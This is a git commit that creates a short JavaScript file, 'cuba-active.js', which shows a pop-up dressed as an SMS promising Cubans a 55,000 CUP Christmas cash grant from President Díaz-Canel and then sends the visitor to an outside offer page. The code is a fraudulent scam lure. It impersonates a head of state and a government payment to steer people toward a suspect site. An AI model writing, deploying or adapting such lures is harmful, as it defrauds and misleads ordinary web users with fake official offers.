679fa10e624b2909ed3ce4202857328d8180b6ae
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-12-10 04:23:30 -0800

    Create cuba-active.js

---
+++ cuba-active.js
@@ -0,0 +1,6 @@
+
+var password = 'RETIRAR CUP55,000'
+password=prompt('SMS: Felicitaciones, califica para ser presidente Miquel Díaz-Canel SUBVENCIÓN EN EFECTIVO DE NAVIDAD DE CUP55,000 PARA Cubans. Por favor, presione OK para retirar la subvención en efectivo de Navidad.   ','RETIRAR CUP55,000');
+if (password != 'RETIRAR CUP55,000') {
+location.href='https://get-offre.org/cuba-grant.html';
+}
